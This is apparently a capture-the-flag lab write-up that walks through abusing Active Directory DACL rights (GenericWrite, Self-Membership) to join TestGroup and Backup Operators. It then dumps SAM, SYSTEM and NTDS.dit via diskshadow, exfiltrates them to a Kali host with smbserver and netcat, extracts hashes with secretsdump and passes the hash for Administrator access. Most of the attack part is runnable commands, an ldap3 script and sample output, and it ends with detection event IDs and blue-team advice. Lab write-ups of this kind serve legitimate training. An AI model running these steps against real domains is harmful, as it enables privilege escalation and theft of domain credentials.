# DACL Attack Path - AddMembers Abuse

Complete walkthrough of exploiting DACL permissions via AddMembers rights in Active Directory.

---

## Attack Overview

**Objective**: Exploit DACL permissions to:
1. Abuse GenericWrite on TestGroup to access restricted share
2. Abuse Self-Membership on Backup Operators to dump domain credentials and gain Administrator access

**Target Environment**:
- Domain: `corp.local`
- DC: `10.10.10.10` (DC01)
- Compromised Account: `lowpriv:Password123`

---

## Question 1: TestGroup Share Access

### Enumeration

**Identify pedro's rights over TestGroup using BloodHound:**

```bash
# Collect AD data
bloodhound-python -d corp.local -u lowpriv -p Password123 -c all -ns 10.10.10.10

# In BloodHound GUI:
# 1. Search for "lowpriv"
# 2. Right-click → "Outbound Object Control" → "First Degree Object Control"
# 3. Look for TestGroup edge
```

**Alternative - dacledit.py:**

```bash
cd /path/to/impacket
python3 examples/dacledit.py -principal lowpriv -target 'TestGroup' -dc-ip 10.10.10.10 corp.local/lowpriv:Password123
```

**Result**: lowpriv has **GenericWrite** on TestGroup

### Exploitation

**Add pedro to TestGroup:**

```bash
# GenericWrite allows using net (not Self-Membership restricted)
net rpc group addmem "TestGroup" lowpriv -U "corp.local"/"lowpriv"%"Password123" -S "10.10.10.10"
```

**Verify membership:**

```bash
net rpc group members "TestGroup" -U "corp.local"/"lowpriv"%"Password123" -S "10.10.10.10"
```

**Access the share and retrieve flag:**

```bash
# Connect via SMB as lowpriv (now TestGroup member)
impacket-smbclient corp.local/lowpriv:Password123@10.10.10.10

# Inside smbclient:
shares
use TestGroup
ls
cat flag.txt
```

**Flag**: `[REDACTED]`

---

## Question 2: Administrator Access via Backup Operators

### Enumeration

**Identify pedro's rights over Backup Operators:**

```bash
# Using dacledit.py
python3 examples/dacledit.py -principal lowpriv -target 'Backup Operators' -dc-ip 10.10.10.10 corp.local/lowpriv:Password123
```

**Expected output:**
```
[*]   ACE[0] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     Access mask               : Self
[*]     Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : lowpriv
```

**Result**: lowpriv has **Self-Membership** on Backup Operators

### Exploitation - Add to Backup Operators

**Critical**: Self-Membership requires LDAP protocol (net will fail with ACCESS_DENIED)

**Create LDAP script (addusertogroup.py):**

```python
# Import necessary modules
import argparse
import sys
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, MODIFY_REPLACE, MODIFY_DELETE

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Add a user to an Active Directory group.')
parser.add_argument('-d','--domain', required=True, help='The domain name of the Active Directory server.')
parser.add_argument('-g','--group', required=True, help='The name of the group to add the user to.')
parser.add_argument('-a','--adduser', required=True, help='The username of the user to add.')
parser.add_argument('-u','--user', required=True, help='The username of an Active Directory user with AddMember privilege.')
parser.add_argument('-p','--password', required=True, help='The password of the Active Directory user.')
args = parser.parse_args()

# Extract values from command-line arguments
domain_name = args.domain
group_name = args.group
user_name = args.adduser
ad_username = args.user
ad_password = args.password

# Construct the search base from the domain name
search_base = 'dc=' + ',dc='.join(domain_name.split('.'))

# Create a connection to the Active Directory server
server = Server(domain_name, get_info=ALL)
conn = Connection(
    server,
    user=f'{domain_name}\\{ad_username}',
    password=ad_password,
    authentication=NTLM
)

# Bind to the server with the given credentials
if conn.bind():
    print('[+] Connected to Active Directory successfully.')
else:
    print('[-] Error: failed to bind to the Active Directory server.')
    sys.exit(1)

# Search for the group with the given name
conn.search(
    search_base=search_base,
    search_filter=f'(&(objectClass=group)(cn={group_name}))',
    attributes=['member']
)

# Check if the group was found
if conn.entries:
    print('[+] Group ' + group_name + ' found.')
else:
    print('[-] Error: group not found.')
    sys.exit(1)

# Extract the group's DN and member list
group_dn = conn.entries[0].entry_dn
members = conn.entries[0].member.values

# Search for the user with the given username
conn.search(
    search_base=search_base,
    search_filter=f'(&(objectClass=user)(sAMAccountName={user_name}))',
    attributes=['distinguishedName']
)

# Check if the user was found
if conn.entries:
    print('[+] User ' + user_name + ' found.')
else:
    print('[-] Error: user not found.')
    sys.exit(1)

# Extract the user's DN
user_dn = conn.entries[0].distinguishedName.value

# Check if the user is already a member of the group
if user_dn in members:
    print('[+] User is already a member of the group.')
else:
    # Add the user to the group
    if conn.modify(
        dn=group_dn,
        changes={'member': [(MODIFY_ADD, [user_dn])]}
    ):
        print('[+] User added to group successfully.')
    else:
        print('[-] There was an error trying to add the user to the group.')
```

**Execute the script:**

```bash
python3 addusertogroup.py -d corp.local -g "Backup Operators" -a lowpriv -u lowpriv -p Password123
```

**Verify membership:**

```bash
net rpc group members 'Backup Operators' -U corp.local/lowpriv%Password123 -S 10.10.10.10
```

### Privilege Escalation - Abuse Backup Operators

**Important**: After adding lowpriv to Backup Operators, you must:
1. Re-authenticate (new Kerberos ticket with updated group membership)
2. Launch cmd.exe as Administrator (required for UAC/SeBackupPrivilege)

#### Step 1: Connect via RDP

```bash
xfreerdp /u:lowpriv /p:Password123 /d:corp.local /v:10.10.10.10
```

#### Step 2: Launch Administrator Command Prompt

- Right-click `cmd.exe` → "Run as administrator"
- Enter lowpriv's credentials when prompted
- UAC will allow elevation because Backup Operators is a privileged group

#### Step 3: Verify Privileges

```cmd
whoami /priv
```

**Expected output:**
```
Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
```

#### Step 4: Dump SAM & SYSTEM Registry Hives

```cmd
reg save hklm\sam C:\users\Public\sam
reg save hklm\system C:\users\Public\system
```

#### Step 5: Create Shadow Copy for NTDS.dit

**Create diskshadow script:**

```cmd
echo set context persistent nowriters > C:\Users\Public\diskshadowscript.txt
echo set metadata c:\windows\temp\file.cab >> C:\Users\Public\diskshadowscript.txt
echo set verbose on >> C:\Users\Public\diskshadowscript.txt
echo begin backup >> C:\Users\Public\diskshadowscript.txt
echo add volume c: alias mydrive >> C:\Users\Public\diskshadowscript.txt
echo create >> C:\Users\Public\diskshadowscript.txt
echo expose %mydrive% p: >> C:\Users\Public\diskshadowscript.txt
echo end backup >> C:\Users\Public\diskshadowscript.txt
```

**Execute diskshadow:**

```cmd
diskshadow /s C:\Users\Public\diskshadowscript.txt
```

**Expected output:**
```
The shadow copy was successfully exposed as p:\.
```

#### Step 6: Copy NTDS.dit from Shadow Copy

```cmd
robocopy /b P:\Windows\ntds\ C:\Users\Public\ ntds.dit
```

### Exfiltration

**Option 1: SMB Server (Recommended)**

**On Kali:**

```bash
# Start SMB server with authentication
sudo smbserver.py -smb2support -username osher -password pass123 share /tmp
```

**On Windows:**

```cmd
# Map network drive
net use \\KALI_IP\share /user:osher pass123

# Copy files
copy C:\Users\Public\sam \\KALI_IP\share\
copy C:\Users\Public\system \\KALI_IP\share\
copy C:\Users\Public\ntds.dit \\KALI_IP\share\
```

**Option 2: Netcat (Faster)**

**On Kali:**

```bash
# Receive ntds.dit
nc -lvnp 4444 > ntds.dit

# Receive sam
nc -lvnp 4445 > sam

# Receive system
nc -lvnp 4446 > system
```

**On Windows (if nc.exe available):**

```cmd
nc.exe KALI_IP 4444 < C:\Users\Public\ntds.dit
nc.exe KALI_IP 4445 < C:\Users\Public\sam
nc.exe KALI_IP 4446 < C:\Users\Public\system
```

**Option 3: RDP Clipboard (Slowest - NOT Recommended)**

Only use for small files or as last resort.

### Credential Extraction

**Extract all hashes from ntds.dit:**

```bash
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

**Example output:**
```
[*] Target system bootKey: 0x1b39bb8394e20baa2d7ffc0e85e6cbe2
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 1636d5aaaf6cd0814af056f16001458e
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[ADMIN_HASH]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[KRBTGT_HASH]:::
<additional accounts...>
```

**Important**: The first Administrator hash is the **local machine** Administrator. For this lab, that's what we need.

### Pass-the-Hash Attack

**Connect as Administrator using hash:**

```bash
impacket-wmiexec administrator@10.10.10.10 -hashes :[ADMIN_HASH]
```

**Retrieve the flag:**

```cmd
cd C:\Users\Administrator\Desktop
type flag.txt
```

**Flag**: `[REDACTED]`

---

## Key Takeaways

### Technical Lessons

1. **Self-Membership vs Other Rights**:
   - Self-Membership: LDAP only (net fails)
   - GenericWrite/GenericAll: net works

2. **Protocol Differences**:
   - `net` uses SMB/RPC (higher level)
   - LDAP speaks directly to directory (honors granular ACEs)

3. **Re-authentication Required**:
   - Adding user to group doesn't update current session
   - New logon = new Kerberos ticket with updated groups

4. **Backup Operators Privileges**:
   - SeBackupPrivilege: Read any file (bypass ACLs)
   - SeRestorePrivilege: Write any file (bypass ACLs)
   - Requires UAC elevation even for non-admins

5. **Shadow Copy Necessity**:
   - NTDS.dit is locked by AD DS service
   - Shadow copy creates unlocked snapshot
   - Can then use robocopy with /b flag (backup mode)

### Attack Chain Summary

**Question 1 (TestGroup):**
```
lowpriv (GenericWrite) → Add self to TestGroup → Access \\DC01\TestGroup\flag.txt
```

**Question 2 (Administrator):**
```
lowpriv (Self-Membership) → Add to Backup Operators → Re-auth + UAC elevation →
SeBackupPrivilege → Dump SAM/SYSTEM/NTDS.dit → Extract hashes →
Pass-the-Hash as Administrator → C:\Users\Administrator\Desktop\flag.txt
```

### Common Pitfalls

1. **Using net for Self-Membership**: Will fail with ACCESS_DENIED
2. **Forgetting to re-authenticate**: New groups won't apply to existing session
3. **Not elevating with UAC**: SeBackupPrivilege requires Administrator context
4. **RDP clipboard for large files**: Extremely slow and unreliable
5. **Confusing local vs domain Administrator**: Check secretsdump output carefully

---

## Tools Used

- **BloodHound**: DACL enumeration and visualization
- **dacledit.py** (Impacket): Query ACL rights
- **ldap3** (Python): LDAP operations for Self-Membership abuse
- **net** (Samba): SMB/RPC group operations
- **reg**: Registry hive backup
- **diskshadow**: VSS shadow copy creation
- **robocopy**: File copy with backup privileges
- **secretsdump.py** (Impacket): Credential extraction
- **wmiexec.py** (Impacket): Pass-the-Hash execution
- **smbclient** / **smbclient.py**: SMB share access

---

## Detection Opportunities

### Event IDs to Monitor

1. **4728**: User added to security-enabled global group
2. **4732**: User added to security-enabled local group
3. **4756**: User added to security-enabled universal group
4. **7036**: Volume Shadow Copy Service state changes
5. **4673**: Sensitive privilege use (SeBackupPrivilege)
6. **4624**: Account logon (Type 3 = Network, Type 10 = RDP)

### Detection Logic

**Suspicious Group Additions:**
```
Event 4732 WHERE
  Group = "Backup Operators" AND
  Subject.Account NOT IN (AdminAccounts) AND
  NOT (TargetAccount IN (ServiceAccounts))
```

**Shadow Copy Creation + File Access:**
```
Event 7036 (VSS started) FOLLOWED BY
Event 4663 (File access to NTDS.dit or SAM) WITHIN 10 minutes
```

**SeBackupPrivilege Usage:**
```
Event 4673 WHERE
  Privilege = "SeBackupPrivilege" AND
  Account NOT IN (BackupSoftwareAccounts)
```

### Blue Team Recommendations

1. **Restrict Backup Operators membership**: Require manager approval
2. **Monitor VSS operations**: Alert on shadow copy creation outside backup windows
3. **Audit DACL changes**: Regular reviews of sensitive group ACLs
4. **Implement tiered admin model**: Separate backup operations from domain admin tasks
5. **Enable advanced auditing**: File access auditing on NTDS.dit, SAM, SYSTEM

---

## References

- Microsoft Docs: Active Directory Security Groups
- Microsoft Docs: Backup Operators Built-in Group
- Impacket Documentation: https://github.com/fortra/impacket
- BloodHound Documentation: https://bloodhound.readthedocs.io/

---

**Date**: February 2026

